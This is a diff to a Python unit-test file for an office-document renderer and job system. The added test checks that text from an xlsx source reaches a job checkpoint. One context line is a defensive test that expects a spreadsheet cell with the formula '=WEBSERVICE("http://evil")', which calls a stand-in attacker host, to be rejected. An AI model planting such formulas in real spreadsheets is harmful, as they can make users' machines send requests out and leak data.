@@ -216,6 +216,11 @@ class WorkV2Tests(unittest.TestCase):
         with self.assertRaises(ValueError):work_office.render('Name,Value\nBad,=WEBSERVICE("http://evil")','xlsx')
 
     def test_office_source_from_composer_and_image_edit_owned_source(self):
+        sheet=work_office.render('Jumlah,Harga\n0,0','xlsx')
+        self.submit('Buat proposal PDF dari dokumen ini',source_files=(io.BytesIO(sheet['content']),'source.xlsx',sheet['mime_type']))
+        sheet_job=f.fixture.store.list_jobs(self.owner)[0]
+        self.assertIn('0, 0',json.loads(sheet_job['checkpoint_json'])['source_materials'][0]['text'])
+        f.fixture.store.control(self.owner,sheet_job['id'],'stop')
         file=work_office.render('# Source\n\n## Facts\nVerified facts about Kilas Works.','docx')
         self.submit('Buat proposal PDF dari dokumen ini',source_files=(io.BytesIO(file['content']),'source.docx',file['mime_type']))
         job=f.fixture.store.list_jobs(self.owner)[0]
